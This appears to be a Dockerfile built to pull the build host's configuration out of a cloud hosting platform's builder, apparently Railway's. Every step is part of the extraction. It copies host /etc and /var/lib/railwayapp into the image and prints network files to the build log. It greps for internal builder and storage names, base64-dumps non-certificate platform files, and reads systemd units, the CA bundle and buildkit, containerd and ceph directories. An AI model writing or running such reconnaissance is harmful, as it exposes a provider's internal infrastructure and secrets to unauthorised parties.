# I67886-C-3a8f
FROM alpine:3.20
RUN echo "MARKER_I67886C_3a8f"
COPY etc /h/etc
COPY var/lib/railwayapp /h/railwayapp
RUN apk add --no-cache openssl >/dev/null 2>&1; echo APKDONE
RUN echo "===C_HOSTS"; cat /h/etc/hosts 2>/dev/null; echo "===C_RESOLV"; cat /h/etc/resolv.conf 2>/dev/null; echo "===C_HOSTNAME"; cat /h/etc/hostname 2>/dev/null; echo "===C_OSREL"; cat /h/etc/os-release 2>/dev/null; echo C_HOSTS_END
RUN echo "===C_GREP_ALL_ETC"; grep -rIaisE 'rrp://|storage-agent|depot|cluster|builderv3|buildkit' /h/etc 2>/dev/null | cut -c1-300 | head -200; echo C_GREP_END
RUN echo "===C_RAILWAYAPP_ALL"; find /h/railwayapp -printf '%y %s %p -> %l\n' 2>/dev/null; echo "---nonpki---"; for f in $(find /h/railwayapp -type f ! -path '*/mtls-pki/*' -size -200k 2>/dev/null); do echo "@@@F $f"; base64 -w0 "$f" | cut -c1-8000; echo; done; echo C_RAILWAYAPP_END
RUN echo "===C_SYSTEMD"; ls -la /h/etc/systemd/system 2>/dev/null | head -60; grep -rIl -iE 'railway|builderv3|buildkit|depot|rrp|storage' /h/etc/systemd 2>/dev/null | head -50; for f in $(grep -rIl -iE 'railway|builderv3|buildkit|depot|rrp|storage' /h/etc/systemd 2>/dev/null | head -20); do echo "@@@F $f"; cat "$f"; done; echo C_SYSTEMD_END
RUN echo "===C_SYSBUNDLE"; openssl crl2pkcs7 -nocrl -certfile /h/etc/ssl/certs/ca-certificates.crt 2>/dev/null | openssl pkcs7 -print_certs -noout 2>/dev/null | grep -i -A1 'subject' | grep -i 'GEN 1\|Railway' | head -20; echo C_SYSBUNDLE_END
RUN echo "===C_LISTDEFAULT"; ls -la /h/etc/buildkit /h/etc/containerd /h/etc/ceph /h/etc/railway* /usr/local/bin 2>/dev/null | head -120; echo C_LISTDEFAULT_END
RUN echo "MARKER_I67886C_DONE"
CMD ["sh","-c","sleep 3600"]
